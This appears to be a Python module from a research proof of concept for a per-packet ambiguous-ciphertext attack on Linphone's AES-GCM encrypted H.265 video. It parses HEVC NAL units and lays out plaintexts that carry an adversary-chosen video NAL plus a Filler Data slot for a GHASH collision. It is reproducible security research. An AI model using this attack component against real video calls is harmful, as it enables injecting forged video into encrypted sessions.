"""H.265 / HEVC NAL parsing + plaintext construction for the Linphone
per-packet ambiguous-ciphertext attack (paper §5.3 + Table 3).

The RTP packet plaintext we craft has the following layout, designed so
that:
  - decryption under K_old recovers an adversary-chosen H.265 NAL that the
    decoder renders as adversary-chosen video, plus a Filler Data NAL
    (nal_unit_type = 38) which the decoder safely skips;
  - decryption under K_new produces pseudo-random bytes; the receiver's
    H.265 RTP depacketizer sees a malformed first-NAL header and discards
    the packet (paper §5.3 single-attack: K_new branch is dropped).

    +-- start of plaintext (per-packet) ----------------------------+
    |                                                              |
    |  ┌──────────────────────────────────────────────────────────┐|
    |  │  start code 0x000001                                      ││ 3 B
    |  │  H.265 NAL header (2 B, e.g. 0x4001 for VPS, 0x2601 IDR…) ││ 2 B
    |  │  Adversary NAL payload (N bytes, EBSP form)               ││ N B
    |  └──────────────────────────────────────────────────────────┘|
    |                                                              |
    |  ┌──────────────────────────────────────────────────────────┐|
    |  │  start code 0x000001                                      ││ 3 B
    |  │  Filler Data NAL header (2 B = 0x4c 0x01,                 ││ 2 B
    |  │    nal_unit_type=38, layer_id=0, temporal_id_plus1=1)     ││
    |  │  filler bytes (M bytes; one 16-byte adjustment slot lives ││ M B
    |  │    here; bracketed by 0xFF bytes; final byte 0x80 to      ││
    |  │    serve as rbsp_trailing_bits for the FD_NUT RBSP)       ││
    |  └──────────────────────────────────────────────────────────┘|
    |                                                              |
    +--------------------------------------------------------------+

The adjustment slot is the 16-byte block (paper Appendix A) over which
the GHASH-collision routine solves so the (single) AES-GCM tag verifies
under both K_enc_OLD and K_enc_NEW. Its position inside the Filler Data
NAL is chosen so that:
  - it falls strictly *after* the FD NAL header, so the decoder treats
    it as Filler Data payload and ignores its contents;
  - the surrounding bytes are 0xFF, which is the canonical filler byte
    in HEVC (sequence of ff_byte | rbsp_trailing_bits).

Per Table 3 of the paper, we restrict ourselves to **Single NAL Unit
packets** (RFC 7798 §4.4.1) here: exactly one VCL or non-VCL NAL per
RTP packet, no Aggregation Packets or Fragmentation Units. That is the
case in which exactly one 16-byte adjustment block fits inside the
trailing Filler Data NAL with one tag per RTP packet."""

from binascii import hexlify

# ---------------------------------------------------------------------------
# H.265 NAL parsing
# ---------------------------------------------------------------------------

START_CODE_3 = b"\x00\x00\x01"
START_CODE_4 = b"\x00\x00\x00\x01"

# RFC 7798 / HEVC spec §7.4.2.2 — selected nal_unit_type values
NAL_TYPE_NAMES = {
    0: "TRAIL_N", 1: "TRAIL_R",
    19: "IDR_W_RADL", 20: "IDR_N_LP", 21: "CRA_NUT",
    32: "VPS_NUT", 33: "SPS_NUT", 34: "PPS_NUT", 35: "AUD_NUT",
    38: "FD_NUT",
    39: "PREFIX_SEI_NUT", 40: "SUFFIX_SEI_NUT",
}

FD_NUT_TYPE = 38


def nal_type(nal_header_first_byte):
    """Extract nal_unit_type from the first byte of a 2-byte H.265 NAL
    header (the first bit is forbidden_zero_bit=0, then 6 bits type)."""
    return (nal_header_first_byte >> 1) & 0x3F


def iter_nal_units(stream):
    """Yield (start_index_of_payload, end_index, nal_type) tuples for every
    NAL unit in `stream`, where indices are byte offsets into `stream`.
    Start codes (000001 or 00000001) precede each payload but are NOT
    included in the [start, end) slice; the slice covers the 2-byte NAL
    header + EBSP payload only."""
    n = len(stream)
    i = 0
    pending = None   # (start_offset, nt) of the NAL we are mid-collecting
    while i + 3 <= n:
        # Try matching a 4-byte start code first, then 3-byte
        if i + 4 <= n and stream[i:i+4] == START_CODE_4:
            sc_end = i + 4
        elif stream[i:i+3] == START_CODE_3:
            sc_end = i + 3
        else:
            i += 1
            continue
        if sc_end >= n:
            return
        nt = nal_type(stream[sc_end])
        if pending is not None:
            yield pending[0], i, pending[1]
        pending = (sc_end, nt)
        i = sc_end + 2  # skip past 2-byte NAL header before searching again
    if pending is not None:
        yield pending[0], n, pending[1]


def split_nal_units(stream):
    """Return a list of raw NAL unit byte strings (NAL header + EBSP),
    in stream order, stripped of their preceding start codes."""
    return [bytes(stream[s:e]) for s, e, _ in iter_nal_units(stream)]


# ---------------------------------------------------------------------------
# Plaintext layout
# ---------------------------------------------------------------------------

def make_fd_nut_payload(filler_len):
    """Construct an HEVC Filler Data NAL unit (nal_unit_type=38) whose
    payload contains `filler_len` bytes of filler, with the final byte
    set to 0x80 (rbsp_trailing_bits). Result is the NAL unit body
    (2-byte header + filler), not including the preceding start code.

    All filler bytes default to 0xFF, the canonical ff_byte. Caller is
    free to overwrite a 16-byte adjustment slot somewhere in the
    payload before final tag computation; the only requirement for
    decoder skipping is the FD_NUT header type, not the byte contents.
    """
    if filler_len < 1:
        raise ValueError("filler_len must be >= 1 (need at least 0x80 trailer)")
    # 2-byte FD_NUT header:
    #   forbidden_zero_bit=0, nal_unit_type=38, nuh_layer_id=0, temporal_id_plus1=1
    #   byte0 = 0 << 7 | (38 << 1) | 0 = 0x4C
    #   byte1 = (0 << 3) | 1         = 0x01
    header = bytes([(0 << 7) | (FD_NUT_TYPE << 1), 0x01])
    body = bytearray(b"\xff" * filler_len)
    body[-1] = 0x80
    return bytes(header + body)


def build_packet_plaintext(adversary_nal,
                           min_pad_before=2,
                           min_pad_after=2,
                           extra_round_up_to=16):
    """Layout one per-packet plaintext (no encryption yet) such that the
    16-byte adjustment slot is **16-byte aligned** inside the plaintext.

    `adversary_nal`: the H.265 NAL bytes (header + payload, NO start code).
    `min_pad_before` / `min_pad_after`: minimum number of 0xFF filler bytes
        on either side of the adjustment slot inside the Filler Data NAL
        (gives the adjustment slot breathing room from the FD_NUT header
        and the rbsp_trailing_bits). Padding may grow beyond these
        minima to ensure the adjustment slot lands on a 16-byte boundary,
        which is required by the AES-CTR keystream and the GHASH-
        collision solver.
    `extra_round_up_to`: round the entire plaintext length up to a
        multiple of this. Default 16 so AES-CTR keystream lines up.

    Returns the tuple (plaintext_bytes, adjustment_block_offset),
    where `adjustment_block_offset` is the (16-byte aligned) byte index
    inside `plaintext_bytes` at which the 16-byte adjustment block
    lives. The block itself is filled with 0x00 placeholders here; the
    caller (Step 2.3 = ambiguous_encrypt.sage) will populate it via
    the GHASH-collision routine."""
    # Bytes before the adjustment slot:
    #   start_code (3) + adversary_nal + start_code (3) + FD_NUT header (2)
    #   + pad_before bytes
    fixed_pre_len = 3 + len(adversary_nal) + 3 + 2
    # Pick pad_before so that fixed_pre_len + pad_before ≡ 0 (mod 16),
    # respecting the user-requested minimum.
    pad_before = min_pad_before
    while (fixed_pre_len + pad_before) % 16 != 0:
        pad_before += 1
    pad_after = min_pad_after

    fd_body_len = pad_before + 16 + pad_after + 1   # +1 for rbsp_trailing_bits
    fd_nal = bytearray(make_fd_nut_payload(fd_body_len))
    # adjustment block offset relative to the start of fd_nal:
    #   2 bytes (FD_NUT header) + pad_before bytes
    adj_in_fd = 2 + pad_before
    for i in range(16):
        fd_nal[adj_in_fd + i] = 0x00

    out = bytearray()
    out += START_CODE_3
    out += adversary_nal
    out += START_CODE_3
    adj_offset = len(out) + adj_in_fd   # absolute offset inside the plaintext
    out += fd_nal

    # Pad with 0xFF up to a `extra_round_up_to`-byte multiple. These
    # bytes lie *after* the FD_NUT NAL's rbsp_trailing_bits so the
    # decoder has already finished parsing FD_NUT; the H.265 depacketizer
    # ignores anything past the last NAL.
    pad = (-len(out)) % extra_round_up_to
    out += b"\xff" * pad

    # Sanity: the adjustment slot must be 16-byte aligned.
    assert adj_offset % 16 == 0, (
        f"adjustment slot offset {adj_offset} is not 16-byte aligned; "
        f"min_pad_before={min_pad_before} adversary_nal_len={len(adversary_nal)}"
    )
    return bytes(out), adj_offset


# ---------------------------------------------------------------------------
# Self-test (parser round-trip + plaintext layout sanity)
# ---------------------------------------------------------------------------

def selftest():
    path = "src-video/IMG_4388_main_1920x1440.h265"
    with open(path, "rb") as f:
        stream = f.read()
    nals = split_nal_units(stream)
    print(f"[+] parsed {len(nals)} NAL units from {path}")
    types = {}
    for nal in nals:
        nt = nal_type(nal[0])
        types[nt] = types.get(nt, 0) + 1
    for nt in sorted(types):
        print(f"      type={nt:2d} ({NAL_TYPE_NAMES.get(nt,'-'):14s}): "
              f"{types[nt]}")

    # Round-trip sanity: the concatenation of (start_code_3 || nal) for
    # every parsed NAL must equal the original stream once we strip
    # leading zeros and any 4-byte start codes. We normalise both sides
    # by replacing 0x00000001 with 0x000001.
    def normalise(b):
        out = bytearray()
        i = 0
        while i < len(b):
            if i + 4 <= len(b) and b[i:i+4] == START_CODE_4:
                out += START_CODE_3
                i += 4
            else:
                out.append(b[i]); i += 1
        return bytes(out)

    rejoined = bytearray()
    for nal in nals:
        rejoined += START_CODE_3
        rejoined += nal
    norm_orig = normalise(stream)
    # Strip any leading zeros before the first start code in the original
    # (in case the file begins with extra padding zeros).
    first_sc = norm_orig.find(START_CODE_3)
    if first_sc > 0:
        norm_orig = norm_orig[first_sc:]
    assert bytes(rejoined) == norm_orig, "NAL split/join not lossless"
    print("[+] NAL split/rejoin round-trip lossless (normalised to 3-byte SCs)")

    # Layout sanity for a representative NAL (the first IDR, if any,
    # otherwise the first non-VPS/SPS/PPS).
    sample = None
    for nal in nals:
        nt = nal_type(nal[0])
        if nt in (19, 20, 21):
            sample = (nt, nal); break
    if sample is None:
        sample = (nal_type(nals[0][0]), nals[0])
    nt, sample_nal = sample
    pt, adj_off = build_packet_plaintext(sample_nal)
    print(f"[+] sample plaintext for NAL type={nt} ({NAL_TYPE_NAMES.get(nt,'-')}): "
          f"{len(pt)} B, adjustment slot at offset {adj_off}")
    # Verify the adjustment slot region is currently zero (placeholder).
    assert pt[adj_off:adj_off+16] == b"\x00" * 16
    # Verify a Filler Data NAL header sits at the expected place:
    fd_hdr_pos = 3 + len(sample_nal) + 3   # sc + adv_nal + sc
    assert pt[fd_hdr_pos] == 0x4C and pt[fd_hdr_pos+1] == 0x01, \
        f"FD_NUT header not found at offset {fd_hdr_pos}"
    print(f"[+] FD_NUT header at offset {fd_hdr_pos}: "
          f"{hexlify(pt[fd_hdr_pos:fd_hdr_pos+2]).decode()}")
    # Verify the rbsp_trailing_bits (0x80) is the last meaningful byte
    # of the FD_NUT NAL.
    print(f"[+] adjustment slot ends at byte {adj_off+16}, "
          f"plaintext total {len(pt)} B (multiple of 16: "
          f"{len(pt) % 16 == 0})")
    print()
    print("[*] OK: NAL parser and plaintext layout work correctly.")


if __name__ == "__main__":
    selftest()
